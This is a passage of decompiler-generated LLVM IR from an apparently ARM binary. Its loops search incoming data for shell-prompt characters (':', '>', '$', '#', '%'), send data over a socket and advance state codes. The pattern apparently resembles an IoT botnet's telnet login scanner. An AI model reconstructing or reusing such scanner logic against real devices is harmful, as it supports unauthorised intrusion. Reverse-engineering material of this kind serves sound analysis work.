  store i1 %v3_11158, i1* %cpsr_c.global-to-local, align 1
  %v8_11158 = icmp eq i8 %v3_11150, 58
  store i1 %v8_11158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11158, label %dec_label_pc_11160, label %dec_label_pc_1112c

dec_label_pc_11160:                               ; preds = %dec_label_pc_11150, %bb357, %dec_label_pc_1113c, %dec_label_pc_11134, %dec_label_pc_1112c, %dec_label_pc_11118, %dec_label_pc_110f4, %dec_label_pc_11110, %dec_label_pc_11108, %bb356
  %v0_11164 = phi i32 [ %v1_110e8, %dec_label_pc_11118 ], [ %v1_110e8, %dec_label_pc_110f4 ], [ %v1_110e8, %dec_label_pc_11110 ], [ %v1_110e8, %dec_label_pc_11108 ], [ %v1_110e8, %bb356 ], [ %v1_11148, %dec_label_pc_1112c ], [ %v1_11148, %dec_label_pc_11134 ], [ %v1_11148, %dec_label_pc_1113c ], [ %v1_11148, %bb357 ], [ %v1_11148, %dec_label_pc_11150 ]
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_11164 = add i32 %v0_11164, 1
  store i32 %v1_11164, i32* @r7, align 4
  %v1_11168 = call i32 @function_11ad8(i32 22)
  store i32 %v2_11318, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_11178 = call i32 @function_11a14(i32 22, i32* nonnull %stack_var_-60)
  store i32 %v3_11178, i32* %r0.global-to-local, align 4
  %v3_1117c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_1117c, i32* @r2, align 4
  store i32 %v3_11178, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11188 = load i32, i32* @r6, align 4
  %v1_11188 = add i32 %v0_11188, 4
  %v2_11188 = inttoptr i32 %v1_11188 to i32*
  %v3_11188 = load i32, i32* %v2_11188, align 4
  store i32 %v3_11188, i32* @r0, align 4
  %v4_1118c = call i32 @function_14ac0(i32 %v3_11188, i32 %v3_11178, i32 %v3_1117c, i32 16384)
  store i32 %v4_1118c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1119c = load i32, i32* @r6, align 4
  %v1_1119c = add i32 %v0_1119c, 4
  %v2_1119c = inttoptr i32 %v1_1119c to i32*
  %v3_1119c = load i32, i32* %v2_1119c, align 4
  store i32 %v3_1119c, i32* @r0, align 4
  %v4_111a0 = call i32 @function_14ac0(i32 %v3_1119c, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2, i32 16384)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_111a8 = call i32 @function_11a38(i32 22)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_111b0 = load i32, i32* @r6, align 4
  %v2_111b0 = add i32 %v1_111b0, 12
  %v3_111b0 = inttoptr i32 %v2_111b0 to i32*
  store i32 7, i32* %v3_111b0, align 4
  br label %dec_label_pc_10e0c

dec_label_pc_111b8:                               ; preds = %dec_label_pc_10cdc
  %v1_111b8 = add i32 %v0_10cdc, 24
  %v2_111b8 = inttoptr i32 %v1_111b8 to i32*
  %v3_111b8 = load i32, i32* %v2_111b8, align 4
  store i32 %v3_111b8, i32* %r2.global-to-local, align 4
  %v1_111bc = add i32 %v3_111b8, -1
  store i32 %v1_111bc, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_111c0 = icmp eq i32 %v1_111bc, 0
  store i1 %v2_111c0, i1* %cpsr_z.global-to-local, align 1
  %tmp358 = icmp slt i32 %v1_111bc, 1
  br i1 %tmp358, label %dec_label_pc_10c5cthread-pre-split.thread, label %dec_label_pc_111c8

dec_label_pc_111c8:                               ; preds = %dec_label_pc_111b8
  %v2_111c8 = add i32 %v1_111bc, %v0_10cdc
  store i32 %v2_111c8, i32* %r3.global-to-local, align 4
  %v1_111cc = add i32 %v2_111c8, 28
  %v2_111cc = inttoptr i32 %v1_111cc to i8*
  %v3_111cc = load i8, i8* %v2_111cc, align 1
  %v4_111cc = zext i8 %v3_111cc to i32
  store i32 %v4_111cc, i32* %r3.global-to-local, align 4
  %v2_111d0 = icmp ugt i8 %v3_111cc, 61
  store i1 %v2_111d0, i1* %cpsr_c.global-to-local, align 1
  %v7_111d0 = icmp eq i8 %v3_111cc, 62
  store i1 %v7_111d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111d0, label %dec_label_pc_11234, label %bb359

bb359:                                            ; preds = %dec_label_pc_111c8
  %v3_111d4 = icmp ugt i8 %v3_111cc, 57
  store i1 %v3_111d4, i1* %cpsr_c.global-to-local, align 1
  %v8_111d4 = icmp eq i8 %v3_111cc, 58
  store i1 %v8_111d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_111d4, label %dec_label_pc_11234, label %dec_label_pc_111dc

dec_label_pc_111dc:                               ; preds = %bb359
  %v2_111dc = icmp ugt i8 %v3_111cc, 35
  store i1 %v2_111dc, i1* %cpsr_c.global-to-local, align 1
  %v7_111dc = icmp eq i8 %v3_111cc, 36
  store i1 %v7_111dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111dc, label %dec_label_pc_11234, label %dec_label_pc_111e4

dec_label_pc_111e4:                               ; preds = %dec_label_pc_111dc
  %v2_111e4 = icmp ugt i8 %v3_111cc, 34
  store i1 %v2_111e4, i1* %cpsr_c.global-to-local, align 1
  %v7_111e4 = icmp eq i8 %v3_111cc, 35
  store i1 %v7_111e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111e4, label %dec_label_pc_11234, label %dec_label_pc_111ec

dec_label_pc_111ec:                               ; preds = %dec_label_pc_111e4
  %v2_111ec = icmp ugt i8 %v3_111cc, 36
  store i1 %v2_111ec, i1* %cpsr_c.global-to-local, align 1
  %v7_111ec = icmp eq i8 %v3_111cc, 37
  store i1 %v7_111ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_111ec, label %dec_label_pc_11234, label %dec_label_pc_1121c.preheader

dec_label_pc_1121c.preheader:                     ; preds = %dec_label_pc_111ec
  %v3_111f0 = add i32 %v0_10cdc, 28
  %v2_111f4 = add i32 %v3_111f0, %v3_111b8
  store i32 %v2_111f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1121c

dec_label_pc_11200:                               ; preds = %bb360
  %v2_11200 = icmp ugt i8 %v3_11224, 35
  store i1 %v2_11200, i1* %cpsr_c.global-to-local, align 1
  %v7_11200 = icmp eq i8 %v3_11224, 36
  store i1 %v7_11200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11200, label %dec_label_pc_11234, label %dec_label_pc_11208

dec_label_pc_11208:                               ; preds = %dec_label_pc_11200
  %v2_11208 = icmp ugt i8 %v3_11224, 34
  store i1 %v2_11208, i1* %cpsr_c.global-to-local, align 1
  %v7_11208 = icmp eq i8 %v3_11224, 35
  store i1 %v7_11208, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11208, label %dec_label_pc_11234, label %dec_label_pc_11210

dec_label_pc_11210:                               ; preds = %dec_label_pc_11208
  %v2_11210 = icmp ugt i8 %v3_11224, 36
  store i1 %v2_11210, i1* %cpsr_c.global-to-local, align 1
  %v7_11210 = icmp eq i8 %v3_11224, 37
  store i1 %v7_11210, i1* %cpsr_z.global-to-local, align 1
  %v1_11214 = add i32 %v0_11214, -1
  store i32 %v1_11214, i32* %r3.global-to-local, align 4
  br i1 %v7_11210, label %dec_label_pc_11234, label %dec_label_pc_1121c

dec_label_pc_1121c:                               ; preds = %dec_label_pc_1121c.preheader, %dec_label_pc_11210
  %v0_11214 = phi i32 [ %v2_111f4, %dec_label_pc_1121c.preheader ], [ %v1_11214, %dec_label_pc_11210 ]
  %v0_1121c = phi i32 [ %v1_111bc, %dec_label_pc_1121c.preheader ], [ %v1_1121c, %dec_label_pc_11210 ]
  %v1_1121c = add i32 %v0_1121c, -1
  store i32 %v1_1121c, i32* %r1.global-to-local, align 4
  %v2_1121c = icmp ne i32 %v0_1121c, 0
  store i1 %v2_1121c, i1* %cpsr_c.global-to-local, align 1
  %v7_1121c = icmp eq i32 %v0_1121c, 1
  store i1 %v7_1121c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1121c, label %dec_label_pc_10c5cthread-pre-split.thread477, label %dec_label_pc_11224

dec_label_pc_11224:                               ; preds = %dec_label_pc_1121c
  %v1_11224 = add i32 %v0_11214, -2
  %v2_11224 = inttoptr i32 %v1_11224 to i8*
  %v3_11224 = load i8, i8* %v2_11224, align 1
  %v4_11224 = zext i8 %v3_11224 to i32
  store i32 %v4_11224, i32* %r2.global-to-local, align 4
  %v2_11228 = icmp ugt i8 %v3_11224, 61
  store i1 %v2_11228, i1* %cpsr_c.global-to-local, align 1
  %v7_11228 = icmp eq i8 %v3_11224, 62
  store i1 %v7_11228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11228, label %dec_label_pc_11234, label %bb360

bb360:                                            ; preds = %dec_label_pc_11224
  %v3_1122c = icmp ugt i8 %v3_11224, 57
  store i1 %v3_1122c, i1* %cpsr_c.global-to-local, align 1
  %v8_1122c = icmp eq i8 %v3_11224, 58
  store i1 %v8_1122c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1122c, label %dec_label_pc_11234, label %dec_label_pc_11200

dec_label_pc_11234:                               ; preds = %dec_label_pc_11224, %bb360, %dec_label_pc_11210, %dec_label_pc_11208, %dec_label_pc_11200, %dec_label_pc_111ec, %dec_label_pc_111c8, %dec_label_pc_111e4, %dec_label_pc_111dc, %bb359
  %v0_11238 = phi i32 [ %v1_111bc, %dec_label_pc_111ec ], [ %v1_111bc, %dec_label_pc_111c8 ], [ %v1_111bc, %dec_label_pc_111e4 ], [ %v1_111bc, %dec_label_pc_111dc ], [ %v1_111bc, %bb359 ], [ %v1_1121c, %dec_label_pc_11200 ], [ %v1_1121c, %dec_label_pc_11208 ], [ %v1_1121c, %dec_label_pc_11210 ], [ %v1_1121c, %bb360 ], [ %v1_1121c, %dec_label_pc_11224 ]
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_11238 = add i32 %v0_11238, 1
  store i32 %v1_11238, i32* @r7, align 4
  %v1_1123c = call i32 @function_11ad8(i32 23)
  store i32 %v2_11318, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v3_1124c = call i32 @function_11a14(i32 23, i32* nonnull %stack_var_-60)
  store i32 %v3_1124c, i32* %r0.global-to-local, align 4
  %v3_11250 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_11250, i32* @r2, align 4
  store i32 %v3_1124c, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1125c = load i32, i32* @r6, align 4
  %v1_1125c = add i32 %v0_1125c, 4
  %v2_1125c = inttoptr i32 %v1_1125c to i32*
  %v3_1125c = load i32, i32* %v2_1125c, align 4
  store i32 %v3_1125c, i32* @r0, align 4
  %v4_11260 = call i32 @function_14ac0(i32 %v3_1125c, i32 %v3_1124c, i32 %v3_11250, i32 16384)
  store i32 %v4_11260, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11270 = load i32, i32* @r6, align 4
  %v1_11270 = add i32 %v0_11270, 4
  %v2_11270 = inttoptr i32 %v1_11270 to i32*
  %v3_11270 = load i32, i32* %v2_11270, align 4
  store i32 %v3_11270, i32* @r0, align 4
  %v4_11274 = call i32 @function_14ac0(i32 %v3_11270, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2, i32 16384)
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_1127c = call i32 @function_11a38(i32 23)
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_11284 = load i32, i32* @r6, align 4
  %v2_11284 = add i32 %v1_11284, 12
  %v3_11284 = inttoptr i32 %v2_11284 to i32*
  store i32 9, i32* %v3_11284, align 4
  br label %dec_label_pc_10e0c

dec_label_pc_1128c:                               ; preds = %dec_label_pc_10cdc
  %v1_1128c = add i32 %v0_10cdc, 24
  %v2_1128c = inttoptr i32 %v1_1128c to i32*
  %v3_1128c = load i32, i32* %v2_1128c, align 4
  store i32 %v3_1128c, i32* %r2.global-to-local, align 4
  %v1_11290 = add i32 %v3_1128c, -1
  store i32 %v1_11290, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11294 = icmp eq i32 %v1_11290, 0
  store i1 %v2_11294, i1* %cpsr_z.global-to-local, align 1
  %tmp361 = icmp slt i32 %v1_11290, 1
  br i1 %tmp361, label %dec_label_pc_10c5cthread-pre-split.thread, label %dec_label_pc_1129c

dec_label_pc_1129c:                               ; preds = %dec_label_pc_1128c
  %v2_1129c = add i32 %v1_11290, %v0_10cdc
  store i32 %v2_1129c, i32* %r3.global-to-local, align 4
  %v1_112a0 = add i32 %v2_1129c, 28
  %v2_112a0 = inttoptr i32 %v1_112a0 to i8*
  %v3_112a0 = load i8, i8* %v2_112a0, align 1
  %v4_112a0 = zext i8 %v3_112a0 to i32
  store i32 %v4_112a0, i32* %r3.global-to-local, align 4
  %v2_112a4 = icmp ugt i8 %v3_112a0, 61
  store i1 %v2_112a4, i1* %cpsr_c.global-to-local, align 1
  %v7_112a4 = icmp eq i8 %v3_112a0, 62
  store i1 %v7_112a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112a4, label %dec_label_pc_11308, label %bb362

bb362:                                            ; preds = %dec_label_pc_1129c
  %v3_112a8 = icmp ugt i8 %v3_112a0, 57
  store i1 %v3_112a8, i1* %cpsr_c.global-to-local, align 1
  %v8_112a8 = icmp eq i8 %v3_112a0, 58
  store i1 %v8_112a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_112a8, label %dec_label_pc_11308, label %dec_label_pc_112b0

dec_label_pc_112b0:                               ; preds = %bb362
  %v2_112b0 = icmp ugt i8 %v3_112a0, 35
  store i1 %v2_112b0, i1* %cpsr_c.global-to-local, align 1
  %v7_112b0 = icmp eq i8 %v3_112a0, 36
  store i1 %v7_112b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112b0, label %dec_label_pc_11308, label %dec_label_pc_112b8

dec_label_pc_112b8:                               ; preds = %dec_label_pc_112b0
  %v2_112b8 = icmp ugt i8 %v3_112a0, 34
  store i1 %v2_112b8, i1* %cpsr_c.global-to-local, align 1
  %v7_112b8 = icmp eq i8 %v3_112a0, 35
  store i1 %v7_112b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112b8, label %dec_label_pc_11308, label %dec_label_pc_112c0

dec_label_pc_112c0:                               ; preds = %dec_label_pc_112b8
  %v2_112c0 = icmp ugt i8 %v3_112a0, 36
  store i1 %v2_112c0, i1* %cpsr_c.global-to-local, align 1
  %v7_112c0 = icmp eq i8 %v3_112a0, 37
  store i1 %v7_112c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112c0, label %dec_label_pc_11308, label %dec_label_pc_112f0.preheader

dec_label_pc_112f0.preheader:                     ; preds = %dec_label_pc_112c0
  %v3_112c4 = add i32 %v0_10cdc, 28
  %v2_112c8 = add i32 %v3_112c4, %v3_1128c
  store i32 %v2_112c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_112f0

dec_label_pc_112d4:                               ; preds = %bb363
  %v2_112d4 = icmp ugt i8 %v3_112f8, 35
  store i1 %v2_112d4, i1* %cpsr_c.global-to-local, align 1
  %v7_112d4 = icmp eq i8 %v3_112f8, 36
  store i1 %v7_112d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112d4, label %dec_label_pc_11308, label %dec_label_pc_112dc

dec_label_pc_112dc:                               ; preds = %dec_label_pc_112d4
  %v2_112dc = icmp ugt i8 %v3_112f8, 34
  store i1 %v2_112dc, i1* %cpsr_c.global-to-local, align 1
  %v7_112dc = icmp eq i8 %v3_112f8, 35
  store i1 %v7_112dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112dc, label %dec_label_pc_11308, label %dec_label_pc_112e4

dec_label_pc_112e4:                               ; preds = %dec_label_pc_112dc
  %v2_112e4 = icmp ugt i8 %v3_112f8, 36
  store i1 %v2_112e4, i1* %cpsr_c.global-to-local, align 1
  %v7_112e4 = icmp eq i8 %v3_112f8, 37
  store i1 %v7_112e4, i1* %cpsr_z.global-to-local, align 1
  %v1_112e8 = add i32 %v0_112e8, -1
  store i32 %v1_112e8, i32* %r3.global-to-local, align 4
  br i1 %v7_112e4, label %dec_label_pc_11308, label %dec_label_pc_112f0

dec_label_pc_112f0:                               ; preds = %dec_label_pc_112f0.preheader, %dec_label_pc_112e4
  %v0_112e8 = phi i32 [ %v2_112c8, %dec_label_pc_112f0.preheader ], [ %v1_112e8, %dec_label_pc_112e4 ]
  %v0_112f0 = phi i32 [ %v1_11290, %dec_label_pc_112f0.preheader ], [ %v1_112f0, %dec_label_pc_112e4 ]
  %v1_112f0 = add i32 %v0_112f0, -1
  store i32 %v1_112f0, i32* %r1.global-to-local, align 4
  %v2_112f0 = icmp ne i32 %v0_112f0, 0
  store i1 %v2_112f0, i1* %cpsr_c.global-to-local, align 1
  %v7_112f0 = icmp eq i32 %v0_112f0, 1
  store i1 %v7_112f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112f0, label %dec_label_pc_10c5cthread-pre-split.thread477, label %dec_label_pc_112f8

dec_label_pc_112f8:                               ; preds = %dec_label_pc_112f0
  %v1_112f8 = add i32 %v0_112e8, -2
  %v2_112f8 = inttoptr i32 %v1_112f8 to i8*
  %v3_112f8 = load i8, i8* %v2_112f8, align 1
  %v4_112f8 = zext i8 %v3_112f8 to i32
  store i32 %v4_112f8, i32* %r2.global-to-local, align 4
  %v2_112fc = icmp ugt i8 %v3_112f8, 61
  store i1 %v2_112fc, i1* %cpsr_c.global-to-local, align 1
  %v7_112fc = icmp eq i8 %v3_112f8, 62
  store i1 %v7_112fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112fc, label %dec_label_pc_11308, label %bb363

bb363:                                            ; preds = %dec_label_pc_112f8
  %v3_11300 = icmp ugt i8 %v3_112f8, 57
  store i1 %v3_11300, i1* %cpsr_c.global-to-local, align 1
  %v8_11300 = icmp eq i8 %v3_112f8, 58
  store i1 %v8_11300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11300, label %dec_label_pc_11308, label %dec_label_pc_112d4

dec_label_pc_11308:                               ; preds = %dec_label_pc_112f8, %bb363, %dec_label_pc_112e4, %dec_label_pc_112dc, %dec_label_pc_112d4, %dec_label_pc_112c0, %dec_label_pc_1129c, %dec_label_pc_112b8, %dec_label_pc_112b0, %bb362
  %v0_1130c = phi i32 [ %v1_11290, %dec_label_pc_112c0 ], [ %v1_11290, %dec_label_pc_1129c ], [ %v1_11290, %dec_label_pc_112b8 ], [ %v1_11290, %dec_label_pc_112b0 ], [ %v1_11290, %bb362 ], [ %v1_112f0, %dec_label_pc_112d4 ], [ %v1_112f0, %dec_label_pc_112dc ], [ %v1_112f0, %dec_label_pc_112e4 ], [ %v1_112f0, %bb363 ], [ %v1_112f0, %dec_label_pc_112f8 ]
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_1130c = add i32 %v0_1130c, 1
  store i32 %v1_1130c, i32* @r7, align 4
  %v1_11310 = call i32 @function_11ad8(i32 21)
  store i32 %v2_11318, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_11320 = call i32 @function_11a14(i32 21, i32* nonnull %stack_var_-60)
  store i32 %v3_11320, i32* %r0.global-to-local, align 4
  %v3_11324 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_11324, i32* @r2, align 4
  store i32 %v3_11320, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11330 = load i32, i32* @r6, align 4
  %v1_11330 = add i32 %v0_11330, 4
  %v2_11330 = inttoptr i32 %v1_11330 to i32*
  %v3_11330 = load i32, i32* %v2_11330, align 4
  store i32 %v3_11330, i32* @r0, align 4
  %v4_11334 = call i32 @function_14ac0(i32 %v3_11330, i32 %v3_11320, i32 %v3_11324, i32 16384)
  store i32 %v4_11334, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11344 = load i32, i32* @r6, align 4
  %v1_11344 = add i32 %v0_11344, 4
  %v2_11344 = inttoptr i32 %v1_11344 to i32*
  %v3_11344 = load i32, i32* %v2_11344, align 4
  store i32 %v3_11344, i32* @r0, align 4
  %v4_11348 = call i32 @function_14ac0(i32 %v3_11344, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2, i32 16384)
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_11350 = call i32 @function_11a38(i32 21)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_11358 = load i32, i32* @r6, align 4
  %v2_11358 = add i32 %v1_11358, 12
  %v3_11358 = inttoptr i32 %v2_11358 to i32*
  store i32 6, i32* %v3_11358, align 4
  br label %dec_label_pc_10e0c

dec_label_pc_11360:                               ; preds = %dec_label_pc_10cdc
  %v1_11360 = add i32 %v0_10cdc, 24
  %v2_11360 = inttoptr i32 %v1_11360 to i32*
  %v3_11360 = load i32, i32* %v2_11360, align 4
  store i32 %v3_11360, i32* %r1.global-to-local, align 4
  %v1_11364 = add i32 %v3_11360, -1
  store i32 %v1_11364, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11368 = icmp eq i32 %v1_11364, 0
  store i1 %v2_11368, i1* %cpsr_z.global-to-local, align 1
  %tmp364 = icmp slt i32 %v1_11364, 1
  br i1 %tmp364, label %dec_label_pc_113dc, label %dec_label_pc_11370

dec_label_pc_11370:                               ; preds = %dec_label_pc_11360
  %v2_11370 = add i32 %v1_11364, %v0_10cdc
  store i32 %v2_11370, i32* %r3.global-to-local, align 4
  %v1_11374 = add i32 %v2_11370, 28
  %v2_11374 = inttoptr i32 %v1_11374 to i8*
  %v3_11374 = load i8, i8* %v2_11374, align 1
  %v4_11374 = zext i8 %v3_11374 to i32
  store i32 %v4_11374, i32* %r3.global-to-local, align 4
  %v2_11378 = icmp ugt i8 %v3_11374, 61
  store i1 %v2_11378, i1* %cpsr_c.global-to-local, align 1
  %v7_11378 = icmp eq i8 %v3_11374, 62
  store i1 %v7_11378, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11378, label %dec_label_pc_115e4, label %bb365

bb365:                                            ; preds = %dec_label_pc_11370
  %v3_1137c = icmp ugt i8 %v3_11374, 57
  store i1 %v3_1137c, i1* %cpsr_c.global-to-local, align 1
  %v8_1137c = icmp eq i8 %v3_11374, 58
  store i1 %v8_1137c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1137c, label %dec_label_pc_115e4, label %dec_label_pc_11384

dec_label_pc_11384:                               ; preds = %bb365
  %v2_11384 = icmp ugt i8 %v3_11374, 35
  store i1 %v2_11384, i1* %cpsr_c.global-to-local, align 1
  %v7_11384 = icmp eq i8 %v3_11374, 36
  store i1 %v7_11384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11384, label %dec_label_pc_115e4, label %dec_label_pc_1138c

dec_label_pc_1138c:                               ; preds = %dec_label_pc_11384
  %v2_1138c = icmp ugt i8 %v3_11374, 34
  store i1 %v2_1138c, i1* %cpsr_c.global-to-local, align 1
  %v7_1138c = icmp eq i8 %v3_11374, 35
  store i1 %v7_1138c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1138c, label %dec_label_pc_115e4, label %dec_label_pc_11394

dec_label_pc_11394:                               ; preds = %dec_label_pc_1138c
  %v2_11394 = icmp ugt i8 %v3_11374, 36
  store i1 %v2_11394, i1* %cpsr_c.global-to-local, align 1
  %v7_11394 = icmp eq i8 %v3_11374, 37
  store i1 %v7_11394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11394, label %dec_label_pc_115e4, label %dec_label_pc_113d4.preheader

dec_label_pc_113d4.preheader:                     ; preds = %dec_label_pc_11394
  %v3_11398 = add i32 %v0_10cdc, 28
  %v2_1139c = add i32 %v3_11398, %v3_11360
  store i32 %v2_1139c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_113d4

dec_label_pc_113a8:                               ; preds = %dec_label_pc_113d4
  %v1_113a8 = add i32 %v0_113cc, -2
  %v2_113a8 = inttoptr i32 %v1_113a8 to i8*
  %v3_113a8 = load i8, i8* %v2_113a8, align 1
  %v4_113a8 = zext i8 %v3_113a8 to i32
  store i32 %v4_113a8, i32* %r2.global-to-local, align 4
  %v2_113ac = icmp ugt i8 %v3_113a8, 61
  store i1 %v2_113ac, i1* %cpsr_c.global-to-local, align 1
  %v7_113ac = icmp eq i8 %v3_113a8, 62
  store i1 %v7_113ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113ac, label %dec_label_pc_115e4, label %bb366

bb366:                                            ; preds = %dec_label_pc_113a8
  %v3_113b0 = icmp ugt i8 %v3_113a8, 57
  store i1 %v3_113b0, i1* %cpsr_c.global-to-local, align 1
  %v8_113b0 = icmp eq i8 %v3_113a8, 58
  store i1 %v8_113b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_113b0, label %dec_label_pc_115e4, label %dec_label_pc_113b8

dec_label_pc_113b8:                               ; preds = %bb366
  %v2_113b8 = icmp ugt i8 %v3_113a8, 35
  store i1 %v2_113b8, i1* %cpsr_c.global-to-local, align 1
  %v7_113b8 = icmp eq i8 %v3_113a8, 36
  store i1 %v7_113b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113b8, label %dec_label_pc_115e4, label %dec_label_pc_113c0

dec_label_pc_113c0:                               ; preds = %dec_label_pc_113b8
  %v2_113c0 = icmp ugt i8 %v3_113a8, 34
  store i1 %v2_113c0, i1* %cpsr_c.global-to-local, align 1
  %v7_113c0 = icmp eq i8 %v3_113a8, 35
  store i1 %v7_113c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113c0, label %dec_label_pc_115e4, label %dec_label_pc_113c8

dec_label_pc_113c8:                               ; preds = %dec_label_pc_113c0
  %v2_113c8 = icmp ugt i8 %v3_113a8, 36
  store i1 %v2_113c8, i1* %cpsr_c.global-to-local, align 1
  %v7_113c8 = icmp eq i8 %v3_113a8, 37
  store i1 %v7_113c8, i1* %cpsr_z.global-to-local, align 1
  %v1_113cc = add i32 %v0_113cc, -1
  store i32 %v1_113cc, i32* %r3.global-to-local, align 4
  br i1 %v7_113c8, label %dec_label_pc_115e4, label %dec_label_pc_113d4

dec_label_pc_113d4:                               ; preds = %dec_label_pc_113d4.preheader, %dec_label_pc_113c8
  %v0_113cc = phi i32 [ %v2_1139c, %dec_label_pc_113d4.preheader ], [ %v1_113cc, %dec_label_pc_113c8 ]
  %v0_113d4 = phi i32 [ %v1_11364, %dec_label_pc_113d4.preheader ], [ %v1_113d4, %dec_label_pc_113c8 ]
  %v1_113d4 = add i32 %v0_113d4, -1
  store i32 %v1_113d4, i32* %r0.global-to-local, align 4
  %v2_113d4 = icmp ne i32 %v0_113d4, 0
  store i1 %v2_113d4, i1* %cpsr_c.global-to-local, align 1
  %v7_113d4 = icmp eq i32 %v0_113d4, 1
  store i1 %v7_113d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_113d4, label %dec_label_pc_113dc, label %dec_label_pc_113a8

dec_label_pc_113dc:                               ; preds = %dec_label_pc_113d4, %dec_label_pc_11360
  %v0_113dc = load i32, i32* @fp, align 4
  store i32 %v0_113dc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19a5c.328 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_113e8 = call i32 @function_12428(i32 %v0_113dc, i32 %v3_11360, i32 ptrtoint ([5 x i8]* @global_var_19a5c.328 to i32), i32 4)
  store i32 %v5_113e8, i32* %r0.global-to-local, align 4
  %v2_113ec = icmp eq i32 %v5_113e8, -1
  store i1 %v2_113ec, i1* %cpsr_c.global-to-local, align 1
  %v7_113ec = icmp eq i32 %v5_113e8, -1
  store i1 %v7_113ec, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_113e8, i32* @r7, align 4
  br i1 %v7_113ec, label %dec_label_pc_119c0, label %dec_label_pc_113f8

dec_label_pc_113f8:                               ; preds = %dec_label_pc_119c0, %dec_label_pc_113dc
  %v0_113f8 = phi i32 [ %v5_119d0, %dec_label_pc_119c0 ], [ %v5_113e8, %dec_label_pc_113dc ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_113f8 = icmp eq i32 %v0_113f8, 0
  store i1 %v2_113f8, i1* %cpsr_z.global-to-local, align 1
  %v5_113fc = icmp sgt i32 %v0_113f8, 0
  br i1 %v5_113fc, label %dec_label_pc_113f8.dec_label_pc_115e8_crit_edge, label %dec_label_pc_11400

dec_label_pc_113f8.dec_label_pc_115e8_crit_edge:  ; preds = %dec_label_pc_113f8
  %v0_115e8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_115e8

dec_label_pc_11400:                               ; preds = %dec_label_pc_11560, %bb374, %dec_label_pc_11494, %dec_label_pc_113f8, %dec_label_pc_116a8, %dec_label_pc_11624, %dec_label_pc_115e8, %dec_label_pc_11730
  %v0_11400 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
